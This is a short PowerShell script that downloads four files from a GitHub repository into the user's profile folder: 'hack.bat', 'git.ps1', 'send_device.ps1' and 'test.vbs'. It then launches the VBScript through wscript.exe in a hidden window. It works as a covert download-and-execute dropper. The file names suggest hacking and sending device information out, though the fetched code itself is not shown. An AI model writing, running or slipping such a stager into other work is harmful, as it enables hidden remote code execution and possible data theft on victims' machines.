$base = "https://github.com/cocodekat/random_shit/raw/main"

$files = @{
    "hack.bat"        = "hack.bat"
    "git.ps1"          = "git.ps1"
    "send_device.ps1"  = "send_device.ps1"
    "test.vbs"         = "test.vbs"
}

foreach ($f in $files.Keys) {
    Invoke-WebRequest "$base/$f" `
        -OutFile "$env:USERPROFILE\$($files[$f])"
}

Start-Process wscript.exe `
    "$env:USERPROFILE\test.vbs" `
    -WindowStyle Hidden
